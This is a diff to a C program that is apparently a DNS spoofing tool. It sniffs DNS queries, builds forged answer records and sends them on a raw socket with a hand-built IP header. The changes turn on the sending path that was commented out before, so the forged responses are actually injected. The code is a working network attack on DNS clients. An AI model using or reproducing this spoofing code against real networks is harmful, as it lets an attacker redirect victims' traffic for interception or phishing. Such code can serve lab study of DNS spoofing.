@@ -199,17 +199,17 @@ return;
 }
 
 void send_forged_dns_response(unsigned long destination_address, u_int16_t destination_port, \
-							char *data)
+							char *data, u_short ip_length)
 {
 	int sd, one = 1;
 	const int *val = &one;
 	
-	// Source and destination addresses: IP and port
+	// Source
 	struct sockaddr_in source;
 	sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
 	if(sd < 0)
 	{
-		printf("socket() error");
+		perror("socket() error\n");
 		return;
 	}
 	source.sin_family = AF_INET;
@@ -219,14 +219,15 @@ void send_forged_dns_response(unsigned long destination_address, u_int16_t desti
 	// Inform the kernel do not fill up the headers' structure, we fabricated our own
 	if(setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
 	{
-	    printf("setsockopt() error");
+	    printf("setsockopt() error\n");
 	    return;
 	}
-	//if(sendto(sd, data, ip->iph_len, 0, (struct sockaddr *)&source, sizeof(source)) < 0)
-	//{
-	//	printf("sendto() error");
-	//	return;
-	//}
+	if(sendto(sd, data, ip_length, 0, (struct sockaddr *)&source, sizeof(source)) < 0)
+	{
+		printf("data length is %d",  ip_length);
+		perror("sendto function() error\n");
+		return;
+	}
 	close(sd);
 }
 void print_ip_packet(char *args, const u_char *packet, u_char **payload, int *size_payload, u_char* stringExpression)
@@ -320,7 +321,7 @@ void print_ip_packet(char *args, const u_char *packet, u_char **payload, int *si
 				answer_data->class = query->class;
 				answer_data->ttl = htonl(600); // Keeping a 
 				answer_data->rdlength = htons(4); // ip value is 4 bytes, hence this is 4
-				answer_data->rdata = htonl(2899903684);  // 127.0.0.0
+				answer_data->rdata = htonl(2130706432);  // 127.0.0.0
 
 				sprintf(args + strlen(args), " %s:%d ->", inet_ntoa(ip->ip_src), ntohs(udp->uh_sport));
 				sprintf(args + strlen(args), " %s:%d ", inet_ntoa(ip->ip_dst), ntohs(udp->uh_dport));
@@ -339,7 +340,7 @@ void print_ip_packet(char *args, const u_char *packet, u_char **payload, int *si
 					print_payload(pay1, sizeof(struct sniff_ip) + sizeof(struct udphdr) + sizeof(struct dns_header) \
 						+ strlen(domain) + 1 + sizeof(struct dns_answer_data));
 					printf("Response End\n");
-					//send_forged_dns_response(ip->ip_src.s_addr, udp->uh_sport, datagram);
+					send_forged_dns_response(ip->ip_src.s_addr, udp->uh_sport, datagram, ntohs(ip->ip_len));
 				}
 			}
 			break;
